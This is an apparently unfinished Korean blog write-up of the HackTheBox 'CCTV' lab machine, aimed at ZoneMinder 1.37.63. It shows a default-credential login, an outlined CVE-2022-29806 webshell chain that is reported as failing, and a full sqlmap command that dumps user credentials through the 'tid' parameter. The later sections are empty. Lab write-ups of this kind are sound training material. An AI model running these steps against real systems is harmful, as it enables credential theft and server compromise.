---
title: "CCTV"
date: 2026-03-19T16:54:05+09:00
draft: false
categories: ["htb"]        # htb / portswigger / ctf / research
series: ["Easy Machine"]               # 단계별 묶음 (Ex. "PortSwigger SQLi Labs", "HTB Starting Point")
difficulty: "Easy"         # Easy / Medium / Hard / Insane
tags: []
thumbnail: "1.png"              # /images/thumbnails/파일명.png
ctf_name: "HackTheBox"
points: 20
solves: 5869
flag: "Active Machine이기 때문에 Flag를 작성 할 수 없습니다."
---

### Active Machine이기에 Flag는 작성하지 않습니다.
### 인터넷 상의 풀이도 없습니다!

## 풀이 인증
![인증](2.png)

## Overview


## 기능 분석
![메인페이지](3.png)
메인페이지에서 다른 기능은 없었고 Staff Login 발견
Rockyou.txt 파일을 이용하여 admin:admin 계정으로
로그인이 가능함을 확인함
![Staff메인화면](4.png)
Staff메인 페이지에서 각종 네트워크 상태를 기록하는 기능들 확인
## Analysis
VerSion을 찾기 위해 WFUZZ 및 불완전한 요청을 보낸 결과
ZoneMinder V1.37.63
CakePHP V2.10.24 (/zm/api/)
![CakePHP](4_1.png)
![Zoneminder_EndPoint](6.png)
## 취약점 탐색 결과
```
ZoneMinder의 CVE-2022-29806  공격 결과 (실패)
해당 공격 체인
CSRF 가져오기 -> 로그 파일 -> /tmp/shell.php 등으로 변경 -> payload 기록 -> include로 실행 
```

```
CakePHP 2.10.24 
EndPoint 발견
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=

tid= 부분 SQL INJECTION 시도
사용 도구 SQLMAP

명령어
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
-D zm -T Users -C Username,Password \
--dump \
--batch \
--dbms=MySQL \
--technique=T \
--cookie="ZMSESSID=<SESSION_ID>"
```
![SQLMAP_시도](9.png)
## SQLMAP 결과



### Initial Recon

```bash

```

## Exploitation

## Flag

```
FLAG{...}
```
